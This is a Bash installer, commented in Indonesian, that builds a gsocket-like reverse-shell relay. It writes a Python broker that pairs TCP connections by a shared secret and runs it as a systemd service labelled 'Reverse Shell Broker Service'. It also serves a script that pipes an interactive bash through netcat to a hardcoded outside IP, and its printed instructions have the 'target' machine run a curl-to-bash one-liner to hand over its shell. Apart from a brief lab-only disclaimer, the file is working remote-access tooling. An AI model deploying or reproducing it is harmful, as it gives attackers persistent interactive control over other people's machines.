#!/usr/bin/env bash
#
# install_gsocket_like.sh
#
# Script ini akan:
# 1. Install Python3, netcat, apache2
# 2. Membuat broker di /root/broker.py
# 3. Membuat service systemd: /etc/systemd/system/broker.service
# 4. Membuat script gsocket.sh di /var/www/html/ untuk diakses via curl
#
# Jalankan dengan: sudo ./install_gsocket_like.sh
#

set -e

echo "[INFO] Update paket dan install dependensi..."
apt-get update -y
apt-get install -y python3 netcat apache2

echo "[INFO] Membuat file broker.py di /root/broker.py..."
cat << 'EOF' > /root/broker.py
#!/usr/bin/env python3
import socket
import threading

HOST = '0.0.0.0'
PORT = 5000

# Menyimpan {secret: [conn1, conn2]}
sessions = {}

def handle_client(conn):
    # Pertama, baca SECRET
    try:
        secret = conn.recv(1024).decode().strip()
    except:
        conn.close()
        return

    if not secret:
        conn.close()
        return

    # Masukkan ke dictionary sessions
    if secret not in sessions:
        sessions[secret] = [conn, None]
        conn.sendall(b"Menunggu pasangan...\n")
    else:
        # Jika slot kedua masih kosong, pasangkan
        if sessions[secret][0] is not None and sessions[secret][1] is None:
            sessions[secret][1] = conn
            conn.sendall(b"Terhubung.\n")
            # Bridge kedua koneksi
            bridge(sessions[secret][0], sessions[secret][1])
            # Hapus entri agar secret bisa dipakai lagi 
            del sessions[secret]
        else:
            conn.sendall(b"Secret sudah dipakai atau penuh.\n")
            conn.close()

def bridge(conn1, conn2):
    t1 = threading.Thread(target=pipe, args=(conn1, conn2))
    t2 = threading.Thread(target=pipe, args=(conn2, conn1))
    t1.start()
    t2.start()

def pipe(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except:
        pass
    finally:
        src.close()
        dst.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[BROKER] Listening on {HOST}:{PORT}")

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn,)).start()

if __name__ == "__main__":
    main()
EOF

chmod +x /root/broker.py

echo "[INFO] Membuat service systemd untuk broker..."
cat << 'EOF' > /etc/systemd/system/broker.service
[Unit]
Description=Reverse Shell Broker Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/env python3 /root/broker.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

echo "[INFO] Mengaktifkan dan menjalankan broker service..."
systemctl daemon-reload
systemctl enable broker.service
systemctl start broker.service

echo "[INFO] Membuat skrip /var/www/html/gsocket.sh yang akan dipanggil via curl..."
cat << 'EOF' > /var/www/html/gsocket.sh
#!/usr/bin/env bash
#
# gsocket.sh -- Script Sederhana untuk "Reverse Shell" via Broker
#
# Dipanggil dengan:
#   X="SecretKey" bash -c "$(curl -fsSL http://IP_VPS/gsocket.sh)"
# atau
#   S="SecretKey" bash -c "$(curl -fsSL http://IP_VPS/gsocket.sh)"
#
# Pastikan broker di VPS berjalan di port 5000.
# KETIDAKAMAN: Lalu lintas tidak dienkripsi. Hanya untuk testing / lab.

BROKER_HOST="45.76.182.111"   # <-- Ganti di runtime dengan IP/Domain VPS, atau di override pakai env
BROKER_PORT="5000"

# Kita ambil SECRET dari X atau S
SECRET="${X:-$S}"

# Jika user override BROKER_HOST di environment, gunakan itu.
[ -n "$GH" ] && BROKER_HOST="$GH"
[ -n "$GP" ] && BROKER_PORT="$GP"

if [ -z "$SECRET" ]; then
  echo "[ERROR] Secret tidak ditemukan. Set variabel X=... atau S=..."
  echo "Contoh: X=\"Secret1337\" bash -c \"\$(curl -fsSL http://IP_VPS/gsocket.sh)\""
  exit 1
fi

echo "[INFO] Menghubungkan ke broker $BROKER_HOST:$BROKER_PORT dengan SECRET=$SECRET..."
# Pastikan netcat (nc) terinstall di sistem. 
# Teknik: Kirim SECRET, lalu jalankan shell interaktif.
(echo "$SECRET"; exec /bin/bash -i) | nc $BROKER_HOST $BROKER_PORT
EOF

chmod +x /var/www/html/gsocket.sh

echo "[INFO] Memastikan apache2 berjalan..."
systemctl restart apache2

echo "------------------------------------------"
echo "[SUKSES] Instalasi selesai!"
echo "Broker berjalan di port 5000."
echo "Script gsocket.sh dapat diakses di: http://IP_VPS_Anda/gsocket.sh"
echo
echo "[CARA PAKAI]"
echo "1. Di Target (mesin yang akan di-remote):"
echo "   X=\"Secret1337\" bash -c \"\$(curl -fsSL http://IP_VPS_Anda/gsocket.sh)\""
echo
echo "2. Di Klien (mesin pengendali):"
echo "   S=\"Secret1337\" bash -c \"\$(curl -fsSL http://IP_VPS_Anda/gsocket.sh)\""
echo
echo "Begitu keduanya pakai SECRET sama, Anda dapat shell interaktif di sisi Klien."
echo
echo "[INFO] Hati-hati dan gunakan hanya di lingkungan yang diizinkan."
echo "------------------------------------------"
